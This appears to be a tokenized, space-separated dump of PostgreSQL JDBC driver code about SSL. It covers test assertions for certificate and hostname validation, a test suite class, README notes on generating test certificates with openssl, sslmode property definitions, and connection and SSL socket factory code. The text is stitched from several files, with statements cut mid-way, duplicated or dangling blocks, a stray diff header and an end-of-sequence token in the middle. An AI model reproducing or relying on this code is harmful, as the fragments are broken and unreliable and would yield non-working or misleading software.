"}", "catch", "(", "AssertionError", "ae", ")", "{", "errors", "=", "addError", "(", "errors", ",", "ae", ")", ";", "}", "if", "(", "sslmode", "=", "=", "SslMode", ".", "ALLOW", "&", "&", "db", ".", "requiresSsl", "(", "))", "{", "/", "/", "Allow", "tries", "to", "connect", "with", "non", "-", "ssl", "first", ",", "and", "it", "always", "throws", "the", "first", "error", "even", "after", "try", "SSL", ".", "/", "/", "\"", "If", "SSL", "was", "expected", "to", "fail", "\"", "(", "e", ".", "g", ".", "invalid", "certificate", ")", ",", "and", "db", "requiresSsl", ",", "then", "ALLOW", "/", "/", "should", "fail", "as", "well", "String", "caseName", "=", "\"", "sslmode", "=", "ALLOW", "and", "db", "\"", "+", "db", "+", "\"", "requires", "SSL", ",", "and", "there", "are", "expected", "SSL", "failures", "\"", ";", "if", "(", "errors", "=", "=", "null", ")", "{", "if", "(", "e", "!", "=", "null", ")", "{", "Assert", ".", "fail", "(", "caseName", "+", "\"", "=", "=>", "connection", "should", "be", "upgraded", "to", "SSL", "with", "no", "failures", "\"", ");", "}", "if", "(", "e", "=", "=", "null", ")", "{", "Assert", ".", "fail", "(", "caseName", "+", "\"", "=", "=>", "connection", "should", "fail", "\"", ");", "}", "Assert", ".", "assertEquals", "(", "caseName", "+", "\"", "=", "=>", "INVALID_AUTHORIZATION_SPECIFICATION", "is", "expected", "\"", ",", "PSQLState", ".", "INVALID_AUTHORIZATION_SPECIFICATION", ".", "getState", "(", "),", "e", ".", "getSQLState", "(", "))", ";", "}", "/", "/", "ALLOW", "is", "ok", "return", ";", "}", "if", "(", "errors", "=", "=", "null", ")", "{", "if", "(", "e", "=", "=", "null", ")", "{", "/", "/", "Assume", "\"", "no", "exception", "\"", "was", "expected", ".", "/", "/", "The", "cases", "like", "\"", "successfully", "connected", "in", "sslmode", "=", "DISABLE", "to", "SSLONLY", "db", "\"", "/", "/", "should", "be", "handled", "with", "assertions", "above", "Assert", ".", "fail", "(", "\"", "SQLException", "present", "when", "it", "was", "not", "expected", "\"", ");", "}", "AssertionError", "firstError", "=", "errors", ".", "get", "(", "0", ")", ";", "if", "(", "errors", ".", "size", "(", ")", "=", "=", "1", ")", "{", "throw", "firstError", ";", "}", "for", "(", "int", "i", "=", "1", ";", "i", "<", "errors", ".", "size", "(", ");", "i", "+", "+)", "{", "AssertionError", "error", "=", "errors", ".", "get", "(", "i", ")", ";", "/", "/", "addSuppressed", "is", "Java", "1", ".", "7", "/", "/#", "if", "mvn", ".", "project", ".", "property", ".", "postgresql", ".", "jdbc", ".", "spec", ">", "=", "\"", "JDBC4", ".", "1", "\"", "firstError", ".", "addSuppressed", "(", "error", ")", ";", "/", "/#", "endif", "error", ".", "printStackTrace", "(", ");", "throw", "firstError", ";", "private", "List", "<", "AssertionError", ">", "addError", "(", "List", "<", "AssertionError", ">", "errors", ",", "AssertionError", "ae", ")", "{", "if", "(", "errors", "=", "=", "null", ")", "{", "errors", "=", "new", "ArrayList", "<", "AssertionError", ">", "()", ";", "}", "errors", ".", "add", "(", "ae", ")", ";", "return", "errors", ";", "/", "**", "*", "Checks", "server", "certificate", "validation", "error", ".", "*", "*", "@", "param", "e", "connection", "exception", "or", "null", "if", "no", "exception", "*", "@", "return", "true", "when", "validation", "pass", ",", "false", "when", "the", "case", "is", "not", "applicable", "*", "@", "throws", "AssertionError", "when", "exception", "does", "not", "match", "expectations", "*", "/", "private", "boolean", "assertServerCertificate", "(", "SQLException", "e", ")", "{", "if", "(", "clientRootCertificate", "=", "=", "ClientRootCertificate", ".", "GOOD", "|", "|", "(", "sslmode", "!", "=", "SslMode", ".", "VERIFY_CA", "&", "&", "sslmode", "!", "=", "SslMode", ".", "VERIFY_FULL", ")", ")", "{", "return", "false", ";", "}", "String", "caseName", "=", "\"", "Server", "certificate", "is", "\"", "+", "clientRootCertificate", "+", "\"", "+", "sslmode", "=", "\"", "+", "sslmode", ";", "if", "(", "e", "=", "=", "null", ")", "{", "Assert", ".", "fail", "(", "caseName", "+", "\"", "should", "result", "in", "failure", "of", "server", "validation", "\"", ");", "}", "Assert", ".", "assertEquals", "(", "caseName", "+", "\"", "=", "=>", "CONNECTION_FAILURE", "is", "expected", "\"", ",", "PSQLState", ".", "CONNECTION_FAILURE", ".", "getState", "(", "),", "e", ".", "getSQLState", "(", "))", ";", "CertPathValidatorException", "validatorEx", "=", "findCause", "(", "e", ",", "CertPathValidatorException", ".", "class", ")", ";", "if", "(", "validatorEx", "=", "=", "null", ")", "{", "Assert", ".", "fail", "(", "caseName", "+", "\"", "=", "=>", "exception", "should", "be", "caused", "by", "CertPathValidatorException", ",", "\"", "+", "\"", "but", "no", "CertPathValidatorException", "is", "present", "in", "the", "getCause", "chain", "\"", ");", "}", "/", "/", "getReason", "is", "Java", "1", ".", "7", "/", "/#", "if", "mvn", ".", "project", ".", "property", ".", "postgresql", ".", "jdbc", ".", "spec", ">", "=", "\"", "JDBC4", ".", "1", "\"", "Assert", ".", "assertEquals", "(", "caseName", "+", "\"", "=", "=>", "CertPathValidatorException", ".", "getReason", "\"", ",", "\"", "NO_TRUST_ANCHOR", "\"", ",", "validatorEx", ".", "getReason", "(", ").", "toString", "(", "))", ";", "/", "/#", "endif", "return", "true", ";", "/", "**", "*", "Checks", "hostname", "validation", "error", ".", "*", "*", "@", "param", "e", "connection", "exception", "or", "null", "if", "no", "exception", "*", "@", "return", "true", "when", "validation", "pass", ",", "false", "when", "the", "case", "is", "not", "applicable", "*", "@", "throws", "AssertionError", "when", "exception", "does", "not", "match", "expectations", "*", "/", "private", "boolean", "assertServerHostname", "(", "SQLException", "e", ")", "{", "if", "(", "sslmode", "!", "=", "SslMode", ".", "VERIFY_FULL", "|", "|", "host", "!", "=", "Hostname", ".", "BAD", ")", "{", "return", "false", ";", "}", "String", "caseName", "=", "\"", "VERIFY_FULL", "+", "hostname", "that", "does", "not", "match", "server", "certificate", "\"", ";", "if", "(", "e", "=", "=", "null", ")", "{", "Assert", ".", "fail", "(", "caseName", "+", "\"", "=", "=>", "CONNECTION_FAILURE", "expected", "\"", ");", "}", "Assert", ".", "assertEquals", "(", "caseName", "+", "\"", "=", "=>", "CONNECTION_FAILURE", "is", "expected", "\"", ",", "PSQLState", ".", "CONNECTION_FAILURE", ".", "getState", "(", "),", "e", ".", "getSQLState", "(", "))", ";", "if", "(", "!", "e", ".", "getMessage", "(", ").", "contains", "(", "\"", "PgjdbcHostnameVerifier", "\"", "))", "{", "Assert", ".", "fail", "(", "caseName", "+", "\"", "=", "=>", "message", "should", "contain", "\"", "+", "\"", "'", "PgjdbcHostnameVerifier", "'", ".", "Actual", "message", "is", "\"", "+", "e", ".", "getMessage", "(", "))", ";", "}", "return", "true", ";", "/", "**", "*", "Checks", "client", "certificate", "validation", "error", ".", "*", "*", "@", "param", "e", "connection", "exception", "or", "null", "if", "no", "exception", "*", "@", "return", "true", "when", "validation", "pass", ",", "false", "when", "the", "case", "is", "not", "applicable", "*", "@", "throws", "AssertionError", "when", "exception", "does", "not", "match", "expectations", "*", "/", "private", "boolean", "assertClientCertificate", "(", "SQLException", "e", ")", "{", "if", "(", "db", ".", "requiresClientCert", "(", ")", "&", "&", "clientCertificate", "=", "=", "ClientCertificate", ".", "EMPTY", ")", "{", "String", "caseName", "=", "\"", "client", "certificate", "was", "not", "sent", "and", "database", "\"", "+", "db", "+", "\"", "requires", "client", "certificate", "\"", ";", "assertClientCertRequired", "(", "e", ",", "caseName", ")", ";", "return", "true", ";", "}", "if", "(", "clientCertificate", "!", "=", "ClientCertificate", ".", "BAD", ")", "{", "return", "false", ";", "}", "/", "/", "Server", "verifies", "certificate", "no", "matter", "how", "it", "is", "configured", ",", "so", "sending", "BAD", "one", "/", "/", "is", "doomed", "to", "fail", "String", "caseName", "=", "\"", "BAD", "client", "certificate", ",", "and", "database", "\"", "+", "db", "+", "\"", "requires", "one", "\"", ";", "if", "(", "e", "=", "=", "null", ")", "{", "Assert", ".", "fail", "(", "caseName", "+", "\"", "should", "result", "in", "failure", "of", "client", "validation", "\"", ");", "}", "Assert", ".", "assertEquals", "(", "caseName", "+", "\"", "=", "=>", "CONNECTION_FAILURE", "is", "expected", "\"", ",", "PSQLState", ".", "CONNECTION_FAILURE", ".", "getState", "(", "),", "e", ".", "getSQLState", "(", "))", ";", "/", "/", "Two", "exceptions", "are", "possible", "/", "/", "SSLHandshakeException", ":", "Received", "fatal", "alert", ":", "unknown_ca", "/", "/", "SocketException", ":", "broken", "pipe", "(", "write", "failed", ")", "SocketException", "brokenPipe", "=", "findCause", "(", "e", ",", "SocketException", ".", "class", ")", ";", "SSLHandshakeException", "handshakeException", "=", "findCause", "(", "e", ",", "SSLHandshakeException", ".", "class", ")", ";", "if", "(", "brokenPipe", "=", "=", "null", "&", "&", "handshakeException", "=", "=", "null", ")", "{", "Assert", ".", "fail", "(", "caseName", "+", "\"", "=", "=>", "exception", "should", "be", "caused", "by", "SocketException", "(", "broken", "pipe", ")", "\"", "+", "\"", "or", "SSLHandshakeException", ".", "No", "exceptions", "of", "such", "kind", "are", "present", "in", "the", "getCause", "chain", "\"", ");", "}", "if", "(", "brokenPipe", "!", "=", "null", "&", "&", "!", "brokenPipe", ".", "getMessage", "(", ").", "contains", "(", "\"", "Broken", "pipe", "\"", "))", "{", "Assert", ".", "fail", "(", "caseName", "+", "\"", "=", "=>", "server", "should", "have", "terminated", "the", "connection", "(", "broken", "pipe", "expected", ")", "\"", "+", "\"", ",", "actual", "exception", "was", "\"", "+", "brokenPipe", ".", "getMessage", "(", "))", ";", "}", "if", "(", "handshakeException", "!", "=", "null", "&", "&", "!", "handshakeException", ".", "getMessage", "(", ").", "contains", "(", "\"", "unknown_ca", "\"", "))", "{", "Assert", ".", "fail", "(", "caseName", "+", "\"", "=", "=>", "server", "should", "have", "terminated", "the", "connection", "(", "expected", "'", "unknown_ca", "'", ")\"", "+", "\"", ",", "actual", "exception", "was", "\"", "+", "handshakeException", ".", "getMessage", "(", "))", ";", "}", "return", "true", ";", "private", "static", "<", "T", "extends", "Throwable", ">", "T", "findCause", "(", "Throwable", "t", ",", "Class", "<", "T", ">", "cause", ")", "{", "while", "(", "t", "!", "=", "null", ")", "{", "if", "(", "cause", ".", "isInstance", "(", "t", ")", ")", "{", "return", "(", "T", ")", "t", ";", "}", "t", "=", "t", ".", "getCause", "(", ");", "}", "return", "null", ";", "}", "@", "Test", "public", "void", "run", "(", ")", "throws", "SQLException", "{", "if", "(", "con", "=", "=", "null", ")", "{", "/", "/", "e", ".", "g", ".", "expected", "failure", "to", "connect", "return", ";", "}", "ResultSet", "rs", "=", "con", ".", "createStatement", "(", ").", "executeQuery", "(", "\"", "select", "ssl_is_used", "(", ")\"", ");", "Assert", ".", "assertTrue", "(", "\"", "select", "ssl_is_used", "(", ")", "should", "return", "a", "row", "\"", ",", "rs", ".", "next", "(", "))", ";", "boolean", "sslUsed", "=", "rs", ".", "getBoolean", "(", "1", ")", ";", "if", "(", "sslmode", "=", "=", "SslMode", ".", "ALLOW", ")", "{", "Assert", ".", "assertEquals", "(", "\"", "ssl_is_used", ":", "\"", ",", "db", ".", "requiresSsl", "(", "),", "sslUsed", ")", ";", "}", "else", "{", "Assert", ".", "assertEquals", "(", "\"", "ssl_is_used", ":", "\"", ",", "sslmode", "!", "=", "SslMode", ".", "DISABLE", "&", "&", "!", "db", ".", "rejectsSsl", "(", "),", "sslUsed", ")", ";", "}", "TestUtil", ".", "closeQuietly", "(", "rs", ")", ";", "}", "import", "org", ".", "junit", ".", "runner", ".", "RunWith", ";", "import", "org", ".", "junit", ".", "runners", ".", "Suite", ";", "@", "RunWith", "(", "Suite", ".", "class", ")", "@", "Suite", ".", "SuiteClasses", "(", "{", "LibPQFactoryHostNameTest", ".", "class", ",", "CommonNameVerifierTest", ".", "class", ",", "SslTest", ".", "class", "}", ")", "public", "class", "SslTestSuite", "{", "#", "enable_ssl_tests", "=", "true</s>enable_ssl_property", "\"", "testsinglecertfactory", "\"", "enable_ssl_property", "\"", "sslhostnossl9", "\"", "enable_ssl_property", "\"", "sslhostgh9", "\"", "enable_ssl_property", "\"", "sslhostbh9", "\"", "enable_ssl_property", "\"", "sslhostsslgh9", "\"", "enable_ssl_property", "\"", "sslhostsslbh9", "\"", "enable_ssl_property", "\"", "sslhostsslcertgh9", "\"", "enable_ssl_property", "\"", "sslhostsslcertbh9", "\"", "enable_ssl_property", "\"", "sslcertgh9", "\"", "enable_ssl_property", "\"", "sslcertbh9", "\"", "|", "sslfactoryarg", "|", "String", "|", "null", "|", "Argument", "forwarded", "to", "constructor", "of", "SSLSocketFactory", "class", ".", "|", "|", "socketFactoryArg", "|", "String", "|", "null", "|", "Argument", "forwarded", "to", "constructor", "of", "SocketFactory", "class", ".", "|", "To", "run", "the", "SSL", "tests", ",", "the", "following", "properties", "are", "used", ":", "certdir", ":", "directory", "where", "the", "certificates", "and", "keys", "are", "store", "ssl", "<", "TYPE", ">", "<", "gh", "|", "bh", ">", "<", "8", "|", "9", ">", ":", "a", "connection", "string", "to", "the", "appropriate", "database", "TYPE", "is", "the", "TYPE", "or", "METHOD", "field", "from", "pg_hba", ".", "conf", "that", "is", ":", "host", ",", "hostnossl", ",", "hostssl", "and", "the", "special", "types", "hostsslcert", ",", "that", "corresponds", "to", "a", "hostssl", "type", "with", "clientcert", "=", "1", "and", "cert", "that", "corresponds", "to", "a", "hostssl", "type", "with", "cert", "authentication", ".", "'", "gh", "'", "means", ",", "the", "server", "certificate", "matches", "the", "hostname", "(", "good", "hostname", ")", ",", "'", "bh", "'", "means", "it", "is", "not", "(", "bad", "hostname", ")", ".", "It", "can", "be", "simulated", "with", "a", "single", "database", ",", "if", "two", "names", "can", "be", "used", "i", ".", "e", ".", "localhost", "and", "127", ".", "0", ".", "0", ".", "1", ".", "ssloff", "points", "to", "a", "database", ",", "where", "ssl", "is", "off", ".", "The", "last", "number", "is", "the", "server", "major", "version", "For", "each", "connection", ",", "the", "following", "files", "should", "be", "placed", "into", "certdir", ":", "goodclient", ".", "crt", ",", "badclient", ".", "crt", ",", "goodclient", ".", "pk8", ",", "badclient", ".", "pk8", ",", "goodroot", ".", "crt", ",", "badroot", ".", "crt", "optionally", "prefixed", "by", "the", "value", "of", "ssl", "<", "TYPE", ">", "<", "gh", "|", "bh", ">", "prefix", "property", ",", "if", "different", "files", "are", "necessary", "for", "different", "connect", "strings", ".", "This", "directory", "contains", "example", "certificates", "generated", "by", "the", "following", "commands", ":", "openssl", "req", "-", "x509", "-", "newkey", "rsa", ":", "1024", "-", "days", "3650", "-", "keyout", "goodclient", ".", "key", "-", "out", "goodclient", ".", "crt", "#", "Common", "name", "is", "test", ",", "password", "is", "sslpwd", "openssl", "req", "-", "x509", "-", "newkey", "rsa", ":", "1024", "-", "days", "3650", "-", "keyout", "badclient", ".", "key", "-", "out", "badclient", ".", "crt", "#", "Common", "name", "is", "test", ",", "password", "is", "sslpwd", "openssl", "req", "-", "x509", "-", "newkey", "rsa", ":", "1024", "-", "days", "3650", "-", "nodes", "-", "keyout", "badroot", ".", "key", "-", "out", "badroot", ".", "crt", "#", "Common", "name", "is", "localhost", "rm", "badroot", ".", "key", "openssl", "pkcs8", "-", "topk8", "-", "in", "goodclient", ".", "key", "-", "out", "goodclient", ".", "pk8", "-", "outform", "DER", "-", "v1", "PBE", "-", "MD5", "-", "DES", "openssl", "pkcs8", "-", "topk8", "-", "in", "badclient", ".", "key", "-", "out", "badclient", ".", "pk8", "-", "outform", "DER", "-", "v1", "PBE", "-", "MD5", "-", "DES", "cp", "goodclient", ".", "crt", "server", "/", "root", ".", "crt", "cd", "server", "openssl", "req", "-", "x509", "-", "newkey", "rsa", ":", "1024", "-", "nodes", "-", "days", "3650", "-", "keyout", "server", ".", "key", "-", "out", "server", ".", "crt", "cp", "server", ".", "crt", ".", "./", "goodroot", ".", "crt", "#", "Common", "name", "is", "localhost", ",", "no", "password", "The", "subdirectory", "server", "contains", "what", "should", "be", "copied", "to", "the", "PGDATA", "directory", ".", "If", "you", "do", "not", "overwrite", "the", "pg_hba", ".", "conf", "then", "remember", "to", "comment", "out", "all", "lines", "starting", "with", "\"", "host", "all", "\"", ".", "For", "the", "tests", "the", "sslinfo", "module", "must", "be", "installed", "into", "every", "database", ".", "The", "ssl", "=", "on", "must", "be", "set", "in", "postgresql", ".", "conf", "The", "following", "command", "creates", "the", "databases", "and", "installs", "the", "sslinfo", "module", ".", "for", "db", "in", "hostssldb", "hostnossldb", "certdb", "hostsslcertdb", ";", "do", "createdb", "$", "db", "psql", "$", "db", "-", "c", "\"", "create", "extension", "sslinfo", "\"", "done", "The", "username", "for", "connecting", "to", "postgres", "as", "specified", "in", "build", ".", "local", ".", "properties", "tests", "has", "to", "be", "\"", "test", "\"", ".", "@", "@", "-", "0", ",", "0", "+", "1", ",", "44", "@", "@", "*", "*", "*", "sslfactoryarg", "*", "*", "=", "String", "*", "*", "*", "socketFactoryArg", "*", "*", "=", "String", "*", "Control", "use", "of", "SSL", "(", "any", "non", "-", "null", "value", "causes", "SSL", "to", "be", "required", ")", ".", "*", "Parameter", "governing", "the", "use", "of", "SSL", ".", "The", "allowed", "values", "are", "{", "@", "code", "require", "}", ",", "{", "@", "code", "verify", "-", "ca", "}", ",", "*", "{", "@", "code", "verify", "-", "full", "}", ",", "or", "{", "@", "code", "disable", "}", "(", "{@", "code", "allow", "}", "and", "{", "@", "code", "prefer", "}", "are", "not", "implemented", ")", "*", "If", "not", "set", ",", "the", "{", "@", "code", "ssl", "}", "property", "may", "be", "checked", "to", "enable", "SSL", "mode", ".", "SSL_MODE", "(", "\"", "sslmode", "\"", ",", "null", ",", "\"", "Parameter", "governing", "the", "use", "of", "SSL", "\"", ",", "false", ",", "\"", "disable", "\"", ",", "\"", "require", "\"", ",", "\"", "verify", "-", "ca", "\"", ",", "\"", "verify", "-", "full", "\"", "),", "return", "pg_input", ".", "available", "(", ")", ">", "0", "|", "|", "connection", ".", "getInputStream", "(", ").", "available", "(", ")", ">", "0", ";", "@", "Override", "public", "QueryExecutor", "openConnectionImpl", "(", "HostSpec", "[", "]", "hostSpecs", ",", "String", "user", ",", "String", "database", ",", "Properties", "info", ")", "throws", "SQLException", "{", "/", "/", "Extract", "interesting", "values", "from", "the", "info", "properties", ":", "/", "/", "-", "the", "SSL", "setting", "boolean", "requireSSL", ";", "boolean", "trySSL", ";", "String", "sslmode", "=", "PGProperty", ".", "SSL_MODE", ".", "get", "(", "info", ")", ";", "if", "(", "sslmode", "=", "=", "null", ")", "{", "/", "/", "Fall", "back", "to", "the", "ssl", "property", "/", "/", "assume", "\"", "true", "\"", "if", "the", "property", "is", "set", "but", "empty", "requireSSL", "=", "trySSL", "=", "PGProperty", ".", "SSL", ".", "getBoolean", "(", "info", ")", "|", "|", "\"", "\".", "equals", "(", "PGProperty", ".", "SSL", ".", "get", "(", "info", ")", ");", "}", "else", "{", "if", "(", "\"", "disable", "\"", ".", "equals", "(", "sslmode", ")", ")", "{", "requireSSL", "=", "trySSL", "=", "false", ";", "}", "else", "if", "(", "\"", "require", "\"", ".", "equals", "(", "sslmode", ")", "|", "|", "\"", "verify", "-", "ca", "\"", ".", "equals", "(", "sslmode", ")", "|", "|", "\"", "verify", "-", "full", "\"", ".", "equals", "(", "sslmode", ")", ")", "{", "requireSSL", "=", "trySSL", "=", "true", ";", "throw", "new", "PSQLException", "(", "GT", ".", "tr", "(", "\"", "Invalid", "sslmode", "value", ":", "{", "0", "}", "\",", "sslmode", ")", ",", "PSQLState", ".", "CONNECTION_UNABLE_TO_CONNECT", ")", ";", "boolean", "requireTCPKeepAlive", "=", "PGProperty", ".", "TCP_KEEP_ALIVE", ".", "getBoolean", "(", "info", ")", ";", "int", "connectTimeout", "=", "PGProperty", ".", "CONNECT_TIMEOUT", ".", "getInt", "(", "info", ")", "*", "1000", ";", "newStream", "=", "new", "PGStream", "(", "socketFactory", ",", "hostSpec", ",", "connectTimeout", ")", ";", "/", "/", "Construct", "and", "send", "an", "ssl", "startup", "packet", "if", "requested", ".", "if", "(", "trySSL", ")", "{", "newStream", "=", "enableSSL", "(", "newStream", ",", "requireSSL", ",", "info", ",", "connectTimeout", ")", ";", "}", "/", "/", "Set", "the", "socket", "timeout", "if", "the", "\"", "socketTimeout", "\"", "property", "has", "been", "set", ".", "int", "socketTimeout", "=", "PGProperty", ".", "SOCKET_TIMEOUT", ".", "getInt", "(", "info", ")", ";", "if", "(", "socketTimeout", ">", "0", ")", "{", "newStream", ".", "getSocket", "(", ").", "setSoTimeout", "(", "socketTimeout", "*", "1000", ")", ";", "}", "/", "/", "Enable", "TCP", "keep", "-", "alive", "probe", "if", "required", ".", "newStream", ".", "getSocket", "(", ").", "setKeepAlive", "(", "requireTCPKeepAlive", ")", ";", "/", "/", "Try", "to", "set", "SO_SNDBUF", "and", "SO_RECVBUF", "socket", "options", ",", "if", "requested", ".", "/", "/", "If", "receiveBufferSize", "and", "send_buffer_size", "are", "set", "to", "a", "value", "greater", "/", "/", "than", "0", ",", "adjust", ".", "-", "1", "means", "use", "the", "system", "default", ",", "0", "is", "ignored", "since", "not", "/", "/", "supported", ".", "/", "/", "Set", "SO_RECVBUF", "read", "buffer", "size", "int", "receiveBufferSize", "=", "PGProperty", ".", "RECEIVE_BUFFER_SIZE", ".", "getInt", "(", "info", ")", ";", "if", "(", "receiveBufferSize", ">", "-", "1", ")", "{", "/", "/", "value", "of", "0", "not", "a", "valid", "buffer", "size", "value", "if", "(", "receiveBufferSize", ">", "0", ")", "{", "newStream", ".", "getSocket", "(", ").", "setReceiveBufferSize", "(", "receiveBufferSize", ")", ";", "}", "else", "{", "LOGGER", ".", "log", "(", "Level", ".", "WARNING", ",", "\"", "Ignore", "invalid", "value", "for", "receiveBufferSize", ":", "{", "0", "}", "\",", "receiveBufferSize", ")", ";", "}", "}", "/", "/", "Set", "SO_SNDBUF", "write", "buffer", "size", "int", "sendBufferSize", "=", "PGProperty", ".", "SEND_BUFFER_SIZE", ".", "getInt", "(", "info", ")", ";", "if", "(", "sendBufferSize", ">", "-", "1", ")", "{", "if", "(", "sendBufferSize", ">", "0", ")", "{", "newStream", ".", "getSocket", "(", ").", "setSendBufferSize", "(", "sendBufferSize", ")", ";", "LOGGER", ".", "log", "(", "Level", ".", "WARNING", ",", "\"", "Ignore", "invalid", "value", "for", "sendBufferSize", ":", "{", "0", "}", "\",", "sendBufferSize", ")", ";", "if", "(", "LOGGER", ".", "isLoggable", "(", "Level", ".", "FINE", ")", ")", "{", "LOGGER", ".", "log", "(", "Level", ".", "FINE", ",", "\"", "Receive", "Buffer", "Size", "is", "{", "0", "}", "\",", "newStream", ".", "getSocket", "(", ").", "getReceiveBufferSize", "(", "))", ";", "LOGGER", ".", "log", "(", "Level", ".", "FINE", ",", "\"", "Send", "Buffer", "Size", "is", "{", "0", "}", "\",", "newStream", ".", "getSocket", "(", ").", "getSendBufferSize", "(", "))", ";", "}", "List", "<", "String", "[", "]>", "paramList", "=", "getParametersForStartup", "(", "user", ",", "database", ",", "info", ")", ";", "sendStartupPacket", "(", "newStream", ",", "paramList", ")", ";", "/", "/", "Do", "authentication", "(", "until", "AuthenticationOk", ")", ".", "doAuthentication", "(", "newStream", ",", "hostSpec", ".", "getHost", "(", "),", "user", ",", "info", ")", ";", "log", "(", "Level", ".", "FINE", ",", "\"", "ConnectException", "occurred", "while", "connecting", "to", "{", "0", "}", "\",", "cex", ",", "hostSpec", ")", ";", "log", "(", "Level", ".", "FINE", ",", "\"", "IOException", "occurred", "while", "connecting", "to", "{", "0", "}", "\",", "ioe", ",", "hostSpec", ")", ";", "log", "(", "Level", ".", "FINE", ",", "\"", "SQLException", "occurred", "while", "connecting", "to", "{", "0", "}", "\",", "se", ",", "hostSpec", ")", ";", "private", "PGStream", "enableSSL", "(", "PGStream", "pgStream", ",", "boolean", "requireSSL", ",", "Properties", "info", ",", "int", "connectTimeout", ")", "throws", "IOException", ",", "SQLException", "{", "if", "(", "requireSSL", ")", "{", "if", "(", "requireSSL", ")", "{", "/", "/#", "else", "if", "(", "true", ")", "{", "/", "/#", "endif", "while", "(", "pgStream", ".", "hasMessagePending", "(", ")", "|", "|", "timeoutMillis", ">", "=", "0", ")", "{", "package", "org", ".", "postgresql", ".", "ssl", ".", "jdbc4", ";", "import", "org", ".", "postgresql", ".", "ssl", ".", "jdbc4", ".", "LibPQFactory", ";", "SSLSocketFactory", "factory", ";", "String", "sslmode", "=", "PGProperty", ".", "SSL_MODE", ".", "get", "(", "info", ")", ";", "/", "/", "Use", "the", "default", "factory", "if", "no", "specific", "factory", "is", "requested", "/", "/", "unless", "sslmode", "is", "set", "String", "classname", "=", "PGProperty", ".", "SSL_FACTORY", ".", "get", "(", "info", ")", ";", "if", "(", "classname", "=", "=", "null", ")", "{", "/", "/", "If", "sslmode", "is", "set", ",", "use", "the", "libpq", "compatible", "factory", "if", "(", "sslmode", "!", "=", "null", ")", "{", "factory", "=", "new", "LibPQFactory", "(", "info", ")", ";", "}", "else", "{", "factory", "=", "(", "SSLSocketFactory", ")", "SSLSocketFactory", ".", "getDefault", "(", ");", "}", "}", "else", "{", "try", "{", "factory", "=", "(", "SSLSocketFactory", ")", "instantiate", "(", "classname", ",", "info", ",", "true", ",", "PGProperty", ".", "SSL_FACTORY_ARG", ".", "get", "(", "info", ")", ");", "}", "catch", "(", "Exception", "e", ")", "{", "throw", "new", "PSQLException", "(", "GT", ".", "tr", "(", "\"", "The", "SSLSocketFactory", "class", "provided", "{", "0", "}", "could", "not", "be", "instantiated", ".", "\",", "classname", ")", ",", "PSQLState", ".", "CONNECTION_FAILURE", ",", "e", ")", ";", "}", "}", "if", "(", "factory", "instanceof", "LibPQFactory", ")", "{", "/", "/", "throw", "any", "KeyManager", "exception", "(", "(", "LibPQFactory", ")", "factory", ")", ".", "throwKeyManagerException", "(", ");", "}", "if", "(", "sslhostnameverifier", "!", "=", "null", ")", "{", "HostnameVerifier", "hvn", ";", "if", "(", "!", "hvn", ".", "verify", "(", "stream", ".", "getHostSpec", "(", ").", "getHost", "(", "),", "newConnection", ".", "getSession", "(", "))", ")", "{", "throw", "new", "PSQLException", "(", "GT", ".", "tr", "(", "\"", "The", "hostname", "{", "0", "}", "could", "not", "be", "verified", "by", "hostnameverifier", "{", "1", "}", ".\"", ",", "stream", ".", "getHostSpec", "(", ").", "getHost", "(", "),", "sslhostnameverifier", ")", ",", "PSQLState", ".", "CONNECTION_FAILURE", ")", ";", "}", "}", "else", "{", "if", "(", "\"", "verify", "-", "full", "\"", ".", "equals", "(", "sslmode", ")", "&", "&", "factory", "instanceof", "LibPQFactory", ")", "{", "if", "(", "!(", "((", "LibPQFactory", ")", "factory", ")", ".", "verify", "(", "stream", ".", "getHostSpec", "(", ").", "getHost", "(", "),", "newConnection", ".", "getSession", "(", "))", "))", "{", "throw", "new", "PSQLException", "(", "GT", ".", "tr", "(", "\"", "The", "hostname", "{", "0", "}", "could", "not", "be", "verified", ".", "\",", "stream", ".", "getHostSpec", "(", ").", "getHost", "(", "))", ",", "PSQLState", ".", "CONNECTION_FAILURE", ")", ";", "}", "}", "stream", ".", "changeSocket", "(", "newConnection", ")", ";", "*", "Copyright", "(", "c", ")", "2004", ",", "PostgreSQL", "Global", "Development", "Group", "import", "org", ".", "postgresql", ".", "PGProperty", ";", "import", "org", ".", "postgresql", ".", "ssl", ".", "MakeSSL", ";", "import", "org", ".", "postgresql", ".", "ssl", ".", "NonValidatingFactory", ".", "NonValidatingTM", ";", "import", "org", ".", "postgresql", ".", "ssl", ".", "WrappedFactory", ";", "import", "org", ".", "postgresql", ".", "util", ".", "GT", ";", "import", "org", ".", "postgresql", ".", "util", ".", "PSQLState", ";", "import", "java", ".", "io", ".", "Console", ";", "import", "java", ".", "io", ".", "FileInputStream", ";", "import", "java", ".", "io", ".", "FileNotFoundException", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "security", ".", "GeneralSecurityException", ";", "import", "java", ".", "security", ".", "KeyManagementException", ";", "import", "java", ".", "security", ".", "KeyStore", ";", "import", "java", ".", "security", ".", "KeyStoreException", ";", "import", "java", ".", "security", ".", "NoSuchAlgorithmException", ";", "import", "java", ".", "security", ".", "cert", ".", "Certificate", ";", "import", "java", ".", "security", ".", "cert", ".", "CertificateFactory", ";", "import", "java", ".", "security", ".", "cert", ".", "CertificateParsingException", ";", "import", "java", ".", "security", ".", "cert", ".", "X509Certificate", ";", "import", "java", ".", "util", ".", "Collection", ";", "import", "java", ".", "util", ".", "List", ";", "import", "javax", ".", "naming", ".", "InvalidNameException", ";", "import", "javax", ".", "naming", ".", "ldap", ".", "LdapName", ";", "import", "javax", ".", "naming", ".", "ldap", ".", "Rdn", ";", "import", "javax", ".", "net", ".", "ssl", ".", "KeyManager", ";", "import", "javax", ".", "net", ".", "ssl", ".", "SSLContext", ";", "import", "javax", ".", "net", ".", "ssl", ".", "SSLPeerUnverifiedException", ";", "import", "javax", ".", "net", ".", "ssl", ".", "TrustManager", ";", "import", "javax", ".", "net", ".", "ssl", ".", "TrustManagerFactory", ";", "import", "javax", ".", "security", ".", "auth", ".", "callback", ".", "Callback", ";", "import", "javax", ".", "security", ".", "auth", ".", "callback", ".", "CallbackHandler", ";", "import", "javax", ".", "security", ".", "auth", ".", "callback", ".", "PasswordCallback", ";", "import", "javax", ".", "security", ".", "auth", ".", "callback", ".", "UnsupportedCallbackException", ";", "import", "javax", ".", "security", ".", "auth", ".", "x500", ".", "X500Principal", ";", "*", "Provide", "an", "SSLSocketFactory", "that", "is", "compatible", "with", "the", "libpq", "behaviour", ".", "public", "class", "LibPQFactory", "extends", "WrappedFactory", "implements", "HostnameVerifier", "{", "private", "static", "final", "int", 